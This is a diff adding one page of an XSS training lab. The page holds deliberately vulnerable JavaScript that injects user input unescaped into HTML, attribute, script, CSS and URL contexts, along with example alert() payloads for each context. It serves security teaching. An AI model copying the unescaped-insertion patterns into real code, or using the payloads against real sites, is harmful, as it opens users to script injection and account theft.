@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Multi-Context XSS Injection Lab - Advanced XSS Practice Lab for Ethical Cybersecurity Training by Satyajit Sethy">
+    <meta name="author" content="Satyajit Sethy">
+    <title>Lab #13 - Multi-Context Injection | XSS Practice Lab</title>
+    <link rel="stylesheet" href="../style.css">
+    <style>
+        /* Additional styles for context visualization */
+        .context-demo {
+            border: 1px solid #00ff00;
+            padding: 15px;
+            margin: 20px 0;
+            background-color: rgba(0, 255, 0, 0.05);
+        }
+        
+        .context-badge {
+            display: inline-block;
+            padding: 5px 15px;
+            background-color: #000;
+            border: 2px solid #00ff00;
+            color: #00ff00;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        
+        .injection-example {
+            background-color: rgba(0, 0, 0, 0.8);
+            border-left: 4px solid #00ff00;
+            padding: 10px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .context-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .info-card {
+            border: 1px solid #00ff00;
+            padding: 15px;
+            background-color: rgba(0, 255, 0, 0.03);
+        }
+        
+        .info-card h4 {
+            color: #00ff00;
+            margin-top: 0;
+            border-bottom: 1px solid #00ff00;
+            padding-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="lab-container">
+        <header class="lab-header">
+            <h1 class="glitch" data-text="LAB #13: MULTI-CONTEXT XSS">LAB #13: MULTI-CONTEXT INJECTION</h1>
+            <div class="warning-banner">
+                ⚠️ This platform is for ethical cybersecurity learning purposes only. ⚠️
+            </div>
+        </header>
+
+        <main>
+            <section class="lab-description">
+                <h2>Lab Objective</h2>
+                <p>Master XSS injection in different contexts: HTML elements, HTML attributes, JavaScript, and CSS. Understanding context is crucial for successful XSS exploitation.</p>
+                <div class="lab-objective">
+                    Goal: Successfully execute JavaScript in each context by understanding how the browser parses different parts of the page.
+                </div>
+            </section>
+
+            <div class="context-info">
+                <div class="info-card">
+                    <h4>📄 HTML Context</h4>
+                    <p>Injection between HTML tags. Can use <code>&lt;script&gt;</code> or other tags.</p>
+                    <small>Example: <code>&lt;div&gt;INJECT_HERE&lt;/div&gt;</code></small>
+                </div>
+                <div class="info-card">
+                    <h4>🔧 Attribute Context</h4>
+                    <p>Injection inside HTML attributes. Need to break out of quotes.</p>
+                    <small>Example: <code>&lt;input value="INJECT_HERE"&gt;</code></small>
+                </div>
+                <div class="info-card">
+                    <h4>⚡ JavaScript Context</h4>
+                    <p>Injection inside <code>&lt;script&gt;</code> blocks. Need to handle string boundaries.</p>
+                    <small>Example: <code>&lt;script&gt;var x = 'INJECT_HERE';&lt;/script&gt;</code></small>
+                </div>
+                <div class="info-card">
+                    <h4>🎨 CSS Context</h4>
+                    <p>Injection in styles. Can use <code>expression()</code> or <code>url()</code>.</p>
+                    <small>Example: <code>&lt;style&gt;body { color: INJECT_HERE; }&lt;/style&gt;</code></small>
+                </div>
+            </div>
+
+            <section class="vulnerable-section">
+                <div class="context-demo">
+                    <span class="context-badge">CONTEXT SELECTOR</span>
+                    <p>Choose where you want to inject your payload:</p>
+                </div>
+
+                <div class="input-group">
+                    <label for="multiInput">Enter your payload:</label>
+                    <input type="text" id="multiInput" placeholder="e.g., &lt;img src=x onerror=alert(1)&gt;" style="width: 100%;">
+                    
+                    <label for="multiSelect" style="margin-top: 15px; display: block;">Select injection context:</label>
+                    <select id="multiSelect" style="width: 100%; padding: 10px; margin: 10px 0;">
+                        <option value="html">📄 HTML Context (between tags)</option>
+                        <option value="attribute">🔧 Attribute Context (inside value)</option>
+                        <option value="javascript">⚡ JavaScript Context (inside script)</option>
+                        <option value="css">🎨 CSS Context (inside style)</option>
+                        <option value="url">🔗 URL Context (inside href/src)</option>
+                    </select>
+                    
+                    <div style="display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap;">
+                        <button onclick="injectMultiContext()">Inject Payload</button>
+                        <button onclick="showContextExample()">Show Example</button>
+                        <button onclick="resetLab13()" class="reset-button">Reset Lab</button>
+                    </div>
+                </div>
+
+                <div class="injection-example" id="contextTemplate">
+                    <!-- Template will be shown here -->
+                </div>
+
+                <div class="output-area" style="min-height: 200px;">
+                    <span class="output-label">Injection Result</span>
+                    <div id="multiOutput"></div>
+                </div>
+            </section>
+
+            <section class="lab-description">
+                <h3>📚 Context-Specific Payload Examples:</h3>
+                
+                <div style="margin-top: 20px;">
+                    <h4>HTML Context:</h4>
+                    <div class="injection-example">&lt;img src=x onerror=alert('HTML-XSS')&gt;</div>
+                    <div class="injection-example">&lt;svg onload=alert('HTML-XSS')&gt;</div>
+                    
+                    <h4>Attribute Context:</h4>
+                    <div class="injection-example">" onmouseover="alert('Attribute-XSS')" x="</div>
+                    <div class="injection-example">' onclick='alert(\'Attribute-XSS\')' '</div>
+                    
+                    <h4>JavaScript Context:</h4>
+                    <div class="injection-example">'; alert('JS-XSS'); var foo = '</div>
+                    <div class="injection-example">\'; alert('JS-XSS'); //</div>
+                    
+                    <h4>CSS Context:</h4>
+                    <div class="injection-example">&lt;style&gt;body { background: url('javascript:alert(\'CSS-XSS\')'); }&lt;/style&gt;</div>
+                    <div class="injection-example">&lt;style&gt;body { color: expression(alert('CSS-XSS')); }&lt;/style&gt;</div>
+                    
+                    <h4>URL Context:</h4>
+                    <div class="injection-example">javascript:alert('URL-XSS')</div>
+                    <div class="injection-example">data:text/html,&lt;script&gt;alert('URL-XSS')&lt;/script&gt;</div>
+                </div>
+                
+                <h3 class="mt-20">⚠️ Important Notes:</h3>
+                <ul>
+                    <li>Each context requires different syntax and escaping</li>
+                    <li>The same payload won't work in all contexts</li>
+                    <li>Understanding the context is key to successful XSS</li>
+                    <li>Modern frameworks often escape based on context</li>
+                </ul>
+            </section>
+        </main>
+
+        <footer>
+            <div class="footer-content">
+                <p>© 2026 - <span id="currentYear"></span> | Created by Satyajit Sethy</p>
+                <a href="https://github.com/sethysatyajit" target="_blank" rel="noopener noreferrer" class="github-link">GitHub</a>
+            </div>
+        </footer>
+    </div>
+
+    <script src="../script.js"></script>
+    <script>
+        function injectMultiContext() {
+            const payload = document.getElementById('multiInput').value;
+            const context = document.getElementById('multiSelect').value;
+            const output = document.getElementById('multiOutput');
+            const templateEl = document.getElementById('contextTemplate');
+            
+            let result = '';
+            let template = '';
+            
+            // VULNERABLE CODE: Injecting in different contexts without proper escaping
+            switch(context) {
+                case 'html':
+                    // HTML Context - Direct injection between tags
+                    result = `<div class="context-demo">
+                        <h4>HTML Context Injection:</h4>
+                        <div>${payload}</div>
+                        <p class="mt-10"><small>Payload inserted between div tags</small></p>
+                    </div>`;
+                    template = '&lt;div&gt;' + escapeHtml(payload) + '&lt;/div&gt;';
+                    break;
+                    
+                case 'attribute':
+                    // Attribute Context - Inside HTML attribute value
+                    result = `<div class="context-demo">
+                        <h4>Attribute Context Injection:</h4>
+                        <input type="text" value="${payload}" placeholder="Attribute injection" style="width: 100%;">
+                        <p class="mt-10"><small>Payload inserted in value attribute of input tag</small></p>
+                    </div>`;
+                    template = '&lt;input value="' + escapeHtml(payload) + '"&gt;';
+                    break;
+                    
+                case 'javascript':
+                    // JavaScript Context - Inside script block
+                    result = `<div class="context-demo">
+                        <h4>JavaScript Context Injection:</h4>
+                        <div id="js-demo"></div>
+                        <p class="mt-10"><small>Payload inserted in script block (check console)</small></p>
+                    </div>`;
+                    
+                    // Create a script element with the payload
+                    const script = document.createElement('script');
+                    script.textContent = `try {
+                        var userInput = '${payload}';
+                        document.getElementById('js-demo').innerHTML = 'JavaScript executed! Check console for payload.';
+                        console.log('JavaScript Context - User input:', '${payload}');
+                    } catch(e) {
+                        console.log('Error:', e);
+                    }`;
+                    document.body.appendChild(script);
+                    
+                    template = '&lt;script&gt;var x = \'' + escapeHtml(payload) + '\';&lt;/script&gt;';
+                    break;
+                    
+                case 'css':
+                    // CSS Context - Inside style block
+                    result = `<div class="context-demo">
+                        <h4>CSS Context Injection:</h4>
+                        <div style="color: ${payload}; padding: 10px; border: 1px solid #00ff00;">
+                            This text color is controlled by your payload
+                        </div>
+                        <p class="mt-10"><small>Payload inserted in style attribute</small></p>
+                    </div>`;
+                    template = '&lt;div style="color: ' + escapeHtml(payload) + ';"&gt;';
+                    break;
+                    
+                case 'url':
+                    // URL Context - Inside href/src
+                    result = `<div class="context-demo">
+                        <h4>URL Context Injection:</h4>
+                        <a href="${payload}" target="_blank" style="color: #00ff00;">Click me (your payload as URL)</a>
+                        <p class="mt-10"><small>Payload inserted in href attribute</small></p>
+                    </div>`;
+                    template = '&lt;a href="' + escapeHtml(payload) + '"&gt;';
+                    break;
+            }
+            
+            // Display the result
+            if (result) {
+                output.innerHTML = result;
+            }
+            
+            // Show the template
+            if (template) {
+                templateEl.innerHTML = '<strong>Injection Template:</strong> ' + template;
+            }
+            
+            // Log for debugging
+            console.log(`Injected in ${context} context with payload:`, payload);
+        }
+        
+        function showContextExample() {
+            const context = document.getElementById('multiSelect').value;
+            const input = document.getElementById('multiInput');
+            
+            const examples = {
+                'html': '<img src=x onerror=alert(\'HTML-XSS\')>',
+                'attribute': '" onmouseover="alert(\'Attribute-XSS\')" x="',
+                'javascript': '\'; alert(\'JS-XSS\'); var foo = \'',
+                'css': 'red; background: url(javascript:alert(\'CSS-XSS\'));',
+                'url': 'javascript:alert(\'URL-XSS\')'
+            };
+            
+            input.value = examples[context] || '';
+            alert(`Example for ${context} context loaded! Click "Inject Payload" to test.`);
+        }
+        
+        function resetLab13() {
+            document.getElementById('multiInput').value = '';
+            document.getElementById('multiOutput').innerHTML = '';
+            document.getElementById('contextTemplate').innerHTML = '';
+            
+            // Remove any dynamically added scripts
+            const scripts = document.querySelectorAll('script[data-dynamic]');
+            scripts.forEach(script => script.remove());
+            
+            // Show reset confirmation
+            const output = document.getElementById('multiOutput');
+            output.innerHTML = '<div class="success-message" style="color: #00ff00; text-align: center;">Lab reset successfully! Ready for new injections.</div>';
+            setTimeout(() => {
+                if (output.innerHTML.includes('Lab reset')) {
+                    output.innerHTML = '';
+                }
+            }, 3000);
+        }
+        
+        // Helper function to escape HTML for display
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        // Add safety check for JavaScript context
+        window.addEventListener('error', function(e) {
+            console.log('JavaScript error caught:', e.message);
+        }, true);
+    </script>
+</body>
+</html>
